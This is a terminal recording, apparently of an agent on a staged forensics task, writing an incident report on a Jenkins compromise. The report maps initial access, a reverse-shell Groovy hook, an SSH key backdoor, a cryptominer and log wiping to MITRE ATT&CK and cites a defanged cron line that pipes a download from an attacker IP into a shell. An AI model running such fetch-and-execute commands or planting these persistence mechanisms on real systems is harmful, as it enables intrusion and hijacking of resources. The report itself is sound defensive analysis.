[138.616876, "i", "cat <<'EOF' > /app/intrusion-report.md\n# Incident Intrusion Report: Jenkins Controller Exploitation Campaign\n\n## 1. Executive Summary\nAn external threat actor successfully compromised the Ubuntu 22.04 Jenkins controller (`jenkins-prod-01`) by exploiting CVE-2024-23897 (Jenkins CLI arbitrary file read / RCE). Following initial access, the attacker established multiple persistence mechanisms, deployed an XMRig cryptocurrency miner, and performed anti-forensic log wiping. Security product telemetry (`/sas/alerts.json`) detected the initial RCE artifact, the active miner process, the cron job, and the misconfigured Jenkins baseline, but failed to alert on silent persistence mechanisms including a Groovy init hook backdoor and an SSH `authorized_keys` backdoor.\n\n## 2. Attacker Entities & Indicators of Compromise (IoCs)\n- **Attacker IP Address:** `198.51.100.98` (cited at `/sas/cti/advisory.txt:6`, `/disk/var/spool/cron/crontabs/jenkins:5`, `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3`, `/disk/var/lib/.cache/.wiped.bin:1`)\n- **C2 Domain:** `update-jenkins.example.cn` (cited at `/sas/cti/advisory.txt:23`, `/disk/var/lib/.cache/.wiped.bin:1`)\n- **Mining Pool Address:** `stratum+tcp://xmr.jenkins.evil:3333` (cited at `/sas/cti/advisory.txt:24`, `/disk/opt/jenkins/.xmr/xmrig:2`)\n- **Mining Wallet:** `4A0000000000000000003d98ef6bc04b` (cited at `/sas/cti/advisory.txt:25`, `/disk/opt/jenkins/.xmr/xmrig:3`)\n\n## 3. Attack Chain Mapping (MITRE ATT&CK)\n\n### Step 1: Initial Access — CVE-2024-23897 Exploitation\n- **Technique:** T1190 - Exploit Public-Facing Application\n- **Evidence:** `/disk/var/lib/jenkins/jobs/.tmp/config.xml:3` (CLI RCE artifact via `@type` deserialization gadget)\n- **Alerted Status:** Alerted (`/sas/alerts.json:2` - ALERT-01, CHK-01)\n- **Vulnerability Link:** `/sas/vulns.json:3` (CVE-2024-23897)\n- **Details:** The attacker exploited an unauthenticated CLI argument parser flaw in Jenkins to achieve remote code execution.\n\n### Step 2: Execution — Groovy / Shell Execution\n- **Technique:** T1059.004 - Command and Scripting Interpreter: Unix Shell\n- **Evidence:** `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` (Thread spawn executing reverse shell to `198.51.100.98`)\n- **Alerted Status:** **SILENT** (Not detected in `/sas/alerts.json`)\n- **Details:** Groovy execution initiated interactive shell connectivity back to attacker infrastructure.\n\n### Step 3: Persistence — Groovy Init Hook Backdoor\n- **Technique:** T1037.004 - Boot or Logon Initialization Scripts: RC Scripts / Groovy Hook\n- **Evidence:** `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3`\n- **Alerted Status:** **SILENT** (Not detected in `/sas/alerts.json`)\n- **Details:** Planting `z-backdoor.groovy` in `/var/lib/jenkins/init.groovy.d/` ensures automatic reverse shell execution whenever the Jenkins service starts or restarts.\n\n### Step 4: Persistence — SSH Authorized Keys Backdoor\n- **Technique:** T1098.004 - Account Manipulation: SSH Authorized Keys\n- **Evidence:** `/disk/var/lib/jenkins/.ssh/authorized_keys:2` (Attacker `ssh-ed25519`/`ssh-rsa` key added)\n- **Alerted Status:** **SILENT** (Not detected in `/sas/alerts.json`)\n- **Details:** Attacker appended an unauthorized SSH public key to the `jenkins` user's `authorized_keys` file for persistent interactive access.\n\n### Step 5: Execution & Persistence — Cron Job\n- **Technique:** T1053.003 - Scheduled Task/Job: Cron\n- **Evidence:** `/disk/var/spool/cron/crontabs/jenkins:5` (Line 5: `* * * * * root <defanged beacon: curl hxxp://198.51.100.98/x | sh>`)\n- **Alerted Status:** Alerted (`/sas/alerts.json:16` - ALERT-03, CHK-05)\n- **Details:** Cron job configured to beacon every minute to `198.51.100.98` to re-download payloads (`xmrig`, `pgdaemon`, `php`, `redis`, `wget`).\n\n### Step 6: Impact — Resource Hijacking / Cryptomining\n- **Technique:** T1496 - Resource Hijacking\n- **Evidence:** `/disk/opt/jenkins/.xmr/xmrig:1` (XMRig miner process pid 1337 mining to pool `stratum+tcp://xmr.jenkins.evil:3333`)\n- **Alerted Status:** Alerted (`/sas/alerts.json:9` - ALERT-02, CHK-02)\n- **"]
[138.616921, "i", "Details:** Continuous high CPU usage caused by unauthorized cryptomining activities.\n\n### Step 7: Defense Evasion — Jenkins Log Truncation / Log Wiping\n- **Technique:** T1070.002 - Indicator Removal on Host: Clear Linux or Mac System Logs\n- **Evidence:** `/disk/var/lib/.cache/.wiped.bin:1` (Partial recovery showing C2 beaconing data to `198.51.100.98` / `update-jenkins.example.cn`)\n- **Alerted Status:** **SILENT** (Primary logs wiped; artifact recovered forensic fragment)\n- **Details:** Attacker truncated primary Jenkins log files to hinder post-incident investigation.\n\n## 4. Summary of Alerted vs. Silent Activity\n| MITRE ATT&CK | Description | On-Disk Location | SAS Alert Status |\n|---|---|---|---|\n| T1190 | Jenkins RCE Artifact | `/disk/var/lib/jenkins/jobs/.tmp/config.xml` | Alerted (`/sas/alerts.json:2`) |\n| T1059.004 / T1037.004 | Groovy Init Hook Backdoor | `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy` | **SILENT** |\n| T1098.004 | SSH Authorized Key Backdoor | `/disk/var/lib/jenkins/.ssh/authorized_keys` | **SILENT** |\n| T1053.003 | Cron Job Persistence | `/disk/var/spool/cron/crontabs/jenkins:5` | Alerted (`/sas/alerts.json:16`) |\n| T1496 | XMRig Cryptominer | `/disk/opt/jenkins/.xmr/xmrig` | Alerted (`/sas/alerts.json:9`) |\n| T1070.002 | Log Wiping / Anti-Forensics | `/disk/var/lib/.cache/.wiped.bin` | **SILENT** |\n| Baseline | Security Realm Disabled | `/disk/var/lib/jenkins/config.xml` | Alerted (`/sas/alerts.json:23`) |\nEOF\n"]
[138.617675, "o", "cat <<'EOF' > /app/intrusion-report.md\r\n\u001b[?2004l\r\u001b[?2004h> "]
